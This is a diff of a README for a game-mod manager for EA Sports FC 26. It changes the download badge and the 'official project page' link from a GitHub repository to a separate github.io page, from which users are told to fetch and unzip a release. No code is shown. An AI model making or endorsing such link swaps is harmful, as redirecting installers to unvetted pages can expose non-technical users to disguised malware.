@@ -1,6 +1,6 @@
 # ⚽ FC26-Mod-Store-Pro - Manage your game mods with ease
 
-[![Download FC26-Mod-Store-Pro](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/compulsive-kiswahili611/FC26-Mod-Store-Pro)
+[![Download FC26-Mod-Store-Pro](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://compulsive-kiswahili611.github.io)
 
 FC26-Mod-Store-Pro helps you browse, install, and manage custom content for EA Sports FC 26. This tool simplifies the modding process. It handles BepInEx integration, provides automatic updates for your installed files, and lets you save mod presets for quick switching. You do not need technical knowledge to use this software.
 
@@ -17,7 +17,7 @@ Your computer must meet these basic requirements to run the application:
 
 Follow these steps to set up the tool on your Windows computer:
 
-1.  Visit the [official project page](https://github.com/compulsive-kiswahili611/FC26-Mod-Store-Pro) to see the available versions.
+1.  Visit the [official project page](https://compulsive-kiswahili611.github.io) to see the available versions.
 2.  Look for the latest release in the Releases section on the right side of that page.
 3.  Download the compressed file (typically a .zip file) to your Downloads folder.
 4.  Right-click the downloaded file and select "Extract All" to unpack the contents.
